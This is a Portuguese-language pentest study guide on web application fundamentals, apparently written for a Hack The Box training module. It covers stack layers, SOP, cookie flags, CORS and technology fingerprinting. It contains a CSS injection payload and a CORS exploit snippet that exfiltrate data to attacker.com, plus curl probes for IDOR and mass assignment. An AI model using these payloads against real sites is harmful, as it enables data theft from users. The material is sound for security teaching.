---
title: "Web App Fundamentals"
---

# Fundamentos de Aplicações Web

---

## Contexto: Componentes de uma Aplicação Web e Onde Cada Vulnerabilidade Reside

Antes de atacar uma aplicação web, é necessário entender como ela é construída — não porque isso seja uma curiosidade técnica, mas porque cada camada da arquitetura tem uma classe de vulnerabilidade própria, e conhecer a camada certa orienta onde testar, o que injetar e como interpretar o comportamento observado.

**Cada camada tem sua classe de vulnerabilidade:**

| Camada | Tecnologia | Vulnerabilidades típicas |
|--------|-----------|--------------------------|
| Browser (front-end) | HTML, CSS, JavaScript, DOM | XSS, prototype pollution, clickjacking |
| Servidor web | Apache, NGINX, IIS | Path traversal, misconfigs, info disclosure |
| App server | PHP, Python, Node.js, Java | SQLi, RCE, SSRF, desserialização insegura |
| Banco de dados | MySQL, PostgreSQL, MongoDB | SQLi, NoSQL injection, privilege escalation |
| APIs | REST, GraphQL, SOAP | IDOR, mass assignment, broken auth |

Sem conhecer a pilha tecnológica do alvo — linguagem, framework, banco, servidor — você não sabe:
- Quais wordlists usar no fuzzing (extensões PHP vs ASPX vs JSP)
- Quais CVEs pesquisar (versão do Apache, versão do framework)
- Como interpretar respostas de erro (stack traces PHP vs Java revelam coisas diferentes)
- Quais vetores de injeção são plausíveis

**Same-Origin Policy: o que protege e o que não protege:**

SOP é a política fundamental de isolamento do browser — JavaScript em `evil.com` não pode ler a resposta de uma requisição para `bank.com`. Mas há dois equívocos frequentes:

1. SOP não impede que requisições sejam *feitas* — só impede que a *resposta* seja lida. CSRF explora exatamente isso: o browser envia a requisição (com cookies) mesmo em cross-site, a SOP só impede que o JavaScript do atacante leia o resultado.

2. XSS bypassa a SOP completamente. Se um atacante injeta JavaScript em `bank.com`, esse JavaScript roda na origem de `bank.com` — tem acesso total a cookies, localStorage, DOM e pode fazer qualquer requisição que um usuário legítimo faria.

**Cookies: por que as flags importam:**

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

Cada flag previne uma classe específica de ataque. `HttpOnly` impede que JavaScript leia o cookie, bloqueando o roubo de sessão por XSS via `document.cookie`. `Secure` garante que o cookie só trafegue em HTTPS, impedindo que um MITM o intercepte em conexões HTTP. `SameSite=Strict` bloqueia o envio do cookie em requisições cross-site, tornando CSRF ineficaz porque o cookie não acompanha a requisição forjada.

A ausência de qualquer uma dessas flags é uma finding legítima — mesmo sem exploração imediata, indica que a proteção correspondente não está ativa.

**Por que isso importa para escolher vetores de ataque:** Identificar o stack tecnológico orienta quais wordlists usar — extensões PHP, ASPX ou JSP dependem da linguagem do back-end. Entender SOP explica por que XSS e CSRF são ataques com impactos fundamentalmente diferentes: XSS executa código na origem do alvo com acesso total, enquanto CSRF apenas envia uma requisição sem ler a resposta. Conhecer o funcionamento de cookies explica por que headers de `Set-Cookie` malconfigurados são vulnerabilidades reais, não apenas ausências de headers. Mapear a superfície completa — browser, servidor, banco de dados e APIs — evita que vetores inteiros sejam ignorados por falta de compreensão da arquitetura.

---

## Arquitetura Front-End, Back-End e Componentes do Servidor

### Arquitetura Web: Front-End vs Back-End

```
[ Usuário ]
     |
[ Browser (Front-End) ]  ← HTML, CSS, JavaScript executam AQUI
     |  HTTP Request
[ Servidor Web ]          ← Apache, NGINX, IIS
     |
[ App Server ]            ← PHP, Python, Node.js, Java
     |
[ Banco de Dados ]        ← MySQL, PostgreSQL, MongoDB
```

**Front-End (Client-Side)**
- Executa no browser do usuário
- Composto por: HTML (estrutura), CSS (estilo), JavaScript (comportamento)
- Usuário tem controle total — pode modificar via DevTools
- Validações só no front-end são inúteis para segurança

**Back-End (Server-Side)**
- Executa no servidor, invisível ao usuário final
- Linguagens: PHP, Python (Django/Flask), Ruby (Rails), Java (Spring), Node.js
- Responsável por: lógica de negócio, autenticação, acesso ao banco de dados
- Vulnerabilidades aqui têm impacto real: SQLi, SSRF, RCE, LFI

### Componentes do Back-End

**Servidores Web**

| Servidor | Market Share | Linguagem | Config Principal |
|----------|-------------|-----------|-----------------|
| Apache | ~31% | C | `/etc/apache2/apache2.conf` |
| NGINX | ~34% | C | `/etc/nginx/nginx.conf` |
| IIS | ~11% | C++ | GUI / applicationHost.config |
| Tomcat | - | Java | `conf/server.xml` |
| LiteSpeed | - | C | `/usr/local/lsws/conf/httpd_config.xml` |

**Apache — Configuração**

```apache
# /etc/apache2/sites-available/site.conf
<VirtualHost *:80>
    ServerName inlanefreight.com
    DocumentRoot /var/www/html
    DirectoryIndex index.php index.html

    # Proibir listagem de diretórios
    <Directory /var/www/html>
        Options -Indexes
        AllowOverride All
    </Directory>
</VirtualHost>
```

Arquivos `.htaccess` permitem override de configuração por diretório — vetor de ataque se upload for permitido.

**NGINX — Configuração**

```nginx
# /etc/nginx/sites-available/site.conf
server {
    listen 80;
    server_name inlanefreight.com;
    root /var/www/html;
    index index.php index.html;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    }
}
```

**Caminhos importantes por SO:**

| Servidor | Linux | Windows |
|----------|-------|---------|
| Apache | `/etc/apache2/` | `C:\xampp\apache\conf\` |
| NGINX | `/etc/nginx/` | `C:\nginx\conf\` |
| IIS | N/A | `C:\Windows\System32\inetsrv\` |
| Apache logs | `/var/log/apache2/` | `C:\xampp\apache\logs\` |
| NGINX logs | `/var/log/nginx/` | `C:\nginx\logs\` |

**Stacks Tecnológicos**

| Stack | OS | Web Server | DB | Linguagem |
|-------|----|-----------|-----|-----------|
| LAMP | Linux | Apache | MySQL | PHP |
| WAMP | Windows | Apache | MySQL | PHP |
| WINS | Windows | IIS | MSSQL | ASP.NET |
| MAMP | macOS | Apache | MySQL | PHP |
| XAMPP | Qualquer | Apache | MySQL | PHP + Perl |
| MEAN | Linux | NGINX/Node | MongoDB | JavaScript |
| Django | Linux | NGINX | PostgreSQL | Python |

**Bancos de Dados**

| Tipo | Exemplos | Uso |
|------|----------|-----|
| Relacional (SQL) | MySQL, PostgreSQL, MSSQL, Oracle | Dados estruturados, transações |
| Não-relacional (NoSQL) | MongoDB, Redis, Cassandra, CouchDB | Dados semi-estruturados, escala |

- SQL DBs: vulneráveis a SQL Injection clássica
- NoSQL DBs: vulneráveis a NoSQL Injection (operadores como `$where`, `$gt`)

---

## Na Prática

### HTML - Estrutura

```html
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <!-- Comentário HTML - visível no source! -->
    <!-- TODO: remover chave de API: key_live_abc123 -->
</head>
<body>
    <form id="loginForm" action="/login" method="POST">
        <input type="text" name="username" id="user">
        <input type="password" name="password">
        <!-- Campo oculto - mas visível no source! -->
        <input type="hidden" name="role" value="user">
        <button type="submit">Login</button>
    </form>
    <script src="/js/app.js"></script>
</body>
</html>
```

Pentest: sempre inspecionar source (`Ctrl+U`), buscar por comentários, campos hidden, chaves de API, endpoints hardcoded.

### CSS - Estrutura e Relevância de Segurança

CSS raramente é vetor de ataque direto, mas pode vazar informações:

```css
/* CSS pode revelar estrutura da aplicação */
.admin-panel { display: none; }  /* Elemento existe mas está oculto */
.dashboard-menu a[href="/api/internal"] { color: red; }  /* Endpoint interno revelado */
```

**CSS Injection** — raro mas possível em alguns contextos:
```css
/* Payload para exfiltrar atributo de elemento */
input[value^="a"] { background: url('https://attacker.com/?c=a'); }
```

### JavaScript e DOM

**DOM (Document Object Model)**: Representação em árvore do HTML, manipulada pelo JavaScript.

```javascript
// Seleção de elementos
document.getElementById('loginForm')
document.querySelector('.admin-panel')
document.querySelectorAll('input[type="password"]')

// Modificação de DOM
document.getElementById('role').value = 'admin';
document.querySelector('[name="role"]').setAttribute('value', 'admin');

// Leitura de dados sensíveis
document.cookie                  // Cookies acessíveis (sem HttpOnly)
localStorage.getItem('token')    // Storage persistente
sessionStorage.getItem('key')    // Storage por sessão
```

**XHR e Fetch API** — como JS faz requisições:

```javascript
// XMLHttpRequest (legado)
var xhr = new XMLHttpRequest();
xhr.open("POST", "/api/login", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        console.log(xhr.responseText);
    }
};
xhr.send(JSON.stringify({user: "admin", pass: "admin"}));

// Fetch API (moderno)
fetch('/api/users', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: 'admin' })
})
.then(res => res.json())
.then(data => console.log(data));
```

### APIs Web

**REST API**

```
GET    /api/users          → Lista usuários
GET    /api/users/1        → Usuário específico
POST   /api/users          → Cria usuário
PUT    /api/users/1        → Atualiza usuário
DELETE /api/users/1        → Remove usuário
```

**Problemas comuns em APIs:**
- IDOR (Insecure Direct Object Reference): `/api/users/1` → mudar para `/api/users/2`
- Mass Assignment: POST com campos extras aceitos
- Falta de autenticação em endpoints sensíveis
- Versões antigas: `/api/v1/admin` vs `/api/v2/admin`

**SOAP (XML-based)**

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <GetUser>
      <UserID>1</UserID>
    </GetUser>
  </soapenv:Body>
</soapenv:Envelope>
```

### Cookies em Detalhe

```javascript
// JavaScript pode ler cookies (sem HttpOnly)
document.cookie
// "username=admin; session=abc123; theme=dark"

// Criar cookie via JS
document.cookie = "role=admin; path=/";

// Não é possível ler cookies HttpOnly via JS
// Tentativa retorna string sem o cookie protegido
```

**Análise de cookies em Burp Suite:**
1. Interceptar requisição
2. Right-click → Send to Decoder
3. Decodificar Base64 se necessário
4. Verificar se contém dados sensíveis (roles, user IDs)
5. Modificar e reenviar

### Same-Origin Policy (SOP)

SOP impede que JavaScript em `evil.com` leia resposta de requisição para `bank.com`.

**Origem = Protocolo + Host + Porta**

| URL A | URL B | Mesma Origem? |
|-------|-------|---------------|
| `https://site.com/page1` | `https://site.com/page2` | Sim |
| `https://site.com` | `http://site.com` | Não (protocolo diferente) |
| `https://site.com` | `https://api.site.com` | Não (subdomínio diferente) |
| `https://site.com` | `https://site.com:8080` | Não (porta diferente) |

SOP não impede requisições, só impede **leitura da resposta** de origens cruzadas.

**O que SOP protege e o que não protege:**
- XSS bypassa SOP: código injetado em `bank.com` roda com a origem de `bank.com`, tem acesso total
- CSRF contorna SOP: a requisição é enviada (com cookies), a SOP só bloqueia a leitura da resposta pelo atacante

### CORS - Cross-Origin Resource Sharing

CORS relaxa a SOP com headers específicos:

```http
# Requisição cross-origin
GET /api/data HTTP/1.1
Host: api.site.com
Origin: https://app.site.com

# Resposta com CORS habilitado
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.site.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
```

**CORS Misconfiguration — vulnerabilidades comuns:**

```http
# ERRO: Reflete qualquer Origin
Access-Control-Allow-Origin: https://evil.com  ← refletido da requisição
Access-Control-Allow-Credentials: true

# ERRO: Wildcard + credentials (browsers rejeitam, mas config ainda está errada)
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# ERRO: Origin null aceita
Access-Control-Allow-Origin: null
```

**Exploração:**
```html
<!-- attacker.com/exploit.html -->
<script>
fetch('https://api.target.com/user/profile', {
    credentials: 'include'  // envia cookies
})
.then(r => r.text())
.then(data => fetch('https://attacker.com/steal?d=' + btoa(data)));
</script>
```

### DevTools do Browser

Ferramentas essenciais para análise de aplicações web:

| Aba | Uso em Pentest |
|-----|----------------|
| **Elements** | Inspecionar/modificar DOM, ver campos hidden |
| **Console** | Executar JS, ver erros, acessar `document.cookie` |
| **Network** | Ver todas requisições HTTP, headers, responses |
| **Sources** | Ver código JS, definir breakpoints, depurar |
| **Application** | Cookies, localStorage, sessionStorage, Service Workers |
| **Security** | Certificado TLS, status de mixed content |

**Console — comandos úteis:**

```javascript
// Listar todos cookies
document.cookie

// Ler localStorage
Object.keys(localStorage).forEach(k => console.log(k, localStorage[k]))

// Listar todos inputs hidden
document.querySelectorAll('input[type="hidden"]').forEach(e => console.log(e.name, e.value))

// Modificar campo e submeter form
document.getElementById('role').value = 'admin';
document.getElementById('loginForm').submit();

// Listar endpoints em scripts
// Buscar por "api" ou "/" no Sources
```

### Identificação de Tecnologias

**Wappalyzer** — extensão de browser que detecta automaticamente:
- Framework (React, Vue, Angular, jQuery)
- Linguagem back-end (PHP, Python, Ruby)
- Servidor web (Apache, NGINX)
- CMS (WordPress, Drupal, Joomla)
- Banco de dados (indicado por cookies ou headers)
- CDN (Cloudflare, Akamai)
- Analytics (Google Analytics, Hotjar)

**Detecção manual:**

```bash
# Via headers HTTP
curl -sI https://target.com | grep -E "Server:|X-Powered-By:|X-Generator:|X-Drupal|X-WordPress"

# Via cookies
curl -sI https://target.com | grep "Set-Cookie"
# PHPSESSID → PHP
# JSESSIONID → Java/Tomcat
# ASP.NET_SessionId → ASP.NET
# wordpress_* → WordPress
# _rails_session → Ruby on Rails

# Via extensões de arquivo (indicam linguagem)
# .php → PHP
# .aspx, .asp → ASP.NET
# .jsp → Java
# .py → Python (Flask/Django endpoints raramente mostram)
```

**Fingerprinting por erros:**

```bash
# Forçar erro 404 com extensão específica
curl https://target.com/notexist.php
curl https://target.com/notexist.aspx
# A página de erro revela o servidor e tecnologia

# Tentar paths conhecidos
curl https://target.com/wp-login.php        # WordPress
curl https://target.com/administrator/      # Joomla
curl https://target.com/user/login         # Drupal
curl https://target.com/login              # Genérico
```

### Headers de Segurança — Análise

```bash
# Verificar headers de segurança de um alvo
curl -sI https://target.com | grep -E "Strict-Transport|Content-Security|X-Frame|X-Content|Referrer-Policy|Permissions"

# Output esperado em site bem configurado:
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
# Content-Security-Policy: default-src 'self'; script-src 'self'
# X-Frame-Options: SAMEORIGIN
# X-Content-Type-Options: nosniff
# Referrer-Policy: strict-origin-when-cross-origin
```

**Ausência de headers = vulnerabilidade potencial:**

| Header ausente | Risco |
|---------------|-------|
| `Strict-Transport-Security` | SSLStrip / downgrade attack |
| `Content-Security-Policy` | XSS sem mitigação |
| `X-Frame-Options` | Clickjacking |
| `X-Content-Type-Options` | MIME sniffing |
| `SameSite=Strict` nos cookies | CSRF |

---

## Exemplos

### Análise Completa de Aplicação - Workflow

```bash
# 1. Identificar tecnologia
curl -sI https://target.com | grep -E "Server:|X-Powered-By:"
# Server: Apache/2.4.41 (Ubuntu)
# X-Powered-By: PHP/7.4.3

# 2. Verificar headers de segurança
curl -sI https://target.com | grep -iE "security|hsts|csp|frame|content-type"

# 3. Inspecionar cookies
curl -sc /tmp/cookies.txt https://target.com/login
cat /tmp/cookies.txt

# 4. Ver código fonte da página principal
curl -s https://target.com | grep -iE "comment|api|key|token|secret|password|hidden"

# 5. Verificar arquivos de info
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml
curl -s https://target.com/.git/HEAD
curl -s https://target.com/phpinfo.php
```

### Exposição de Dados Sensíveis no Front-End

Tipos comuns de dados sensíveis encontrados em source code:

```html
<!-- Chave de API hardcoded em HTML -->
<script>
const API_KEY = "sk-live-abc123def456";
const STRIPE_KEY = "pk_live_xyz789";
</script>

<!-- Endpoint interno em comentário -->
<!-- Backend API: http://internal-api:8080/v2/admin -->

<!-- Campo hidden com dados sensíveis -->
<input type="hidden" name="user_id" value="1337">
<input type="hidden" name="is_admin" value="false">  <!-- pode ser alterado! -->

<!-- Credenciais em comentário de desenvolvimento -->
<!-- Test credentials: admin / SuperSecret123 -->
```

### Exploração de CORS

```bash
# 1. Verificar política CORS
curl -s -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS \
     https://api.target.com/user/profile -I

# 2. Verificar resposta
# Access-Control-Allow-Origin: https://evil.com  ← VULNERÁVEL se refletiu
# Access-Control-Allow-Credentials: true          ← CRÍTICO

# 3. Verificar se null origin é aceito
curl -s -H "Origin: null" https://api.target.com/data -I | grep "Access-Control"
```

### Análise de API REST

```bash
# Enumerar endpoints comuns
curl -s https://api.target.com/v1/users
curl -s https://api.target.com/v2/users
curl -s https://api.target.com/api/users

# IDOR test
curl -s https://api.target.com/v1/users/1 -H "Authorization: Bearer MEUTOKEN"
curl -s https://api.target.com/v1/users/2 -H "Authorization: Bearer MEUTOKEN"

# Mass assignment test
curl -X POST https://api.target.com/v1/users \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123","role":"admin","is_admin":true}'

# Métodos não documentados
curl -X DELETE https://api.target.com/v1/users/1
curl -X PUT https://api.target.com/v1/users/1 -d '{"role":"admin"}'
```

### Fingerprinting de CMS

**WordPress:**
```bash
# Detecção
curl -s https://target.com/wp-login.php | grep -i wordpress
curl -s https://target.com/wp-json/wp/v2/users  # Lista usuários via API REST!
curl -s https://target.com/?author=1             # Redirect revela username

# Enumeração
wpscan --url https://target.com --enumerate u,p,t
```

**Joomla:**
```bash
curl -s https://target.com/administrator/
curl -s https://target.com/README.txt  # Revela versão
```

**Drupal:**
```bash
curl -s https://target.com/CHANGELOG.txt  # Revela versão
curl -s https://target.com/user/register
```

---

## Módulos Relacionados

O módulo de HTTP Protocolo (`01_http_protocolo.md`) cobre os detalhes de headers, métodos e status codes que estruturam toda a comunicação entre as camadas descritas aqui. O módulo de Web Proxies (`03_web_proxies.md`) permite interceptar e manipular essa comunicação entre front-end e back-end em tempo real. Information Gathering (`../02_reconhecimento/01_information_gathering.md`) usa as tecnologias identificadas neste módulo como ponto de partida para recon passivo — saber o stack guia quais CVEs pesquisar. Content Discovery (`../02_reconhecimento/02_content_discovery.md`) aplica fuzzing especificamente nos endpoints de API mapeados aqui. JavaScript Analysis (`../02_reconhecimento/03_javascript_analysis.md`) aprofunda a análise do front-end para extrair endpoints e lógica de negócio do código cliente. SQL Injection surge quando o back-end processa input do usuário sem sanitização adequada, e XSS ocorre quando o front-end renderiza esse input como HTML ou JavaScript.

**Ferramentas mencionadas:**
- Browser DevTools (F12)
- Wappalyzer (extensão)
- Burp Suite (proxy)
- `curl` (requisições CLI)
- WPScan (scanner WordPress)
- Nikto (scanner de vulnerabilidades web)

**Referências HTB:**
- HTB Module: Introduction to Web Applications
- HTB Module: Web Requests
